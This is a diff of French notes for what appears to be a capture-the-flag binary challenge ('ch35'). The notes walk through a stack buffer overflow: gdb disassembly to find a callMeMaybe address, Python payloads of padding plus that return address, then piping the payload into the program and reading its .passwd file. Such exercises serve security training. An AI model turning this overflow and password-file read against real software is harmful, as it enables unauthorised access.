@@ -1,23 +1,28 @@
+## on obtient l'adresse de callMeMaybe.
 gdb ch35
 disas callMeMaybe
 ex :  0x00000000004006cd <+0>:	push   rbp
+q
+
+## On overflow et on cherche dans la memoire ou placer ladresse
 mkdir /tmp/elivet
 cd /tmp/elivet
-touch pok
-python -c 'print("\x90"*268 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "\xcd\x06\x40\x00\x00\x00\x00\x00")' > /tmp/elivet/pok
+touch hey
+python -c 'print("\x90"*268 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "\xcd\x06\x40\x00\x00\x00\x00\x00")' > /tmp/elivet/hey
 
 gdb ch35
-run < /tmp/elivet/pok
+run < /tmp/elivet/hey
 ex : RBP: 0x4C4B4A4948474645
 traduction hexa -> ascii 
 ex : RBP: E...............L
 Quit
 
-stop at the first letter found in RBP 
-python -c 'print("\x90"*268 + "ABCD" + "\xcd\x06\x40\x00\x00\x00\x00\x00")' > /tmp/elivet/pok
+## On s'arrete donc a la premiere lettre trouvee dans le registre RBP
+python -c 'print("\x90"*268 + "ABCD" + "\xcd\x06\x40\x00\x00\x00\x00\x00")' > /tmp/elivet/hey
 
+## On verifie que RBP contient bien notre adresse
 gdb ch35
-run < /tmp/elivet/pok
+run < /tmp/elivet/hey
 
 (python -c 'print("\x90"*276 + "ABCD" + "\xcd\x06\x40\x00\x00\x00\x00\x00")' && cat) | ./ch35
 cat .passwd
